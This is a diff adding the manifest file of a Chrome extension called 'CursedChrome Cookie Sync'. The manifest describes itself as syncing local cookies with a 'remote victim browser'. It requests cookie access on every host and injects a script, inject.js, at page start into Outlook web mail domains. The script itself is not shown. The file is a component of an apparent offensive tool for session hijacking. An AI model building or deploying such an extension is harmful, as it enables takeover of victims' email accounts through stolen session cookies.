@@ -1,0 +1,34 @@
+{
+  "name": "CursedChrome Cookie Sync",
+  "version": "1.0.0",
+  "manifest_version": 3,
+  "description": "Syncs local browser cookies with the remote victim browser.",
+  "icons": {
+    "16": "icons/icon16.png",
+    "48": "icons/icon48.png",
+    "128": "icons/icon128.png"
+  },
+  "action": {
+    "default_icon": "icons/icon48.png",
+    "default_title": "Cookie Sync",
+    "default_popup": "popup.html"
+  },
+  "permissions": [
+    "cookies",
+    "storage"
+  ],
+  "host_permissions": [
+    "*://*/*"
+  ],
+  "content_scripts": [
+    {
+      "matches": [
+        "https://outlook.office.com/*",
+        "https://outlook.cloud.microsoft/*",
+        "https://outlook.live.com/*"
+      ],
+      "js": ["inject.js"],
+      "run_at": "document_start"
+    }
+  ]
+}
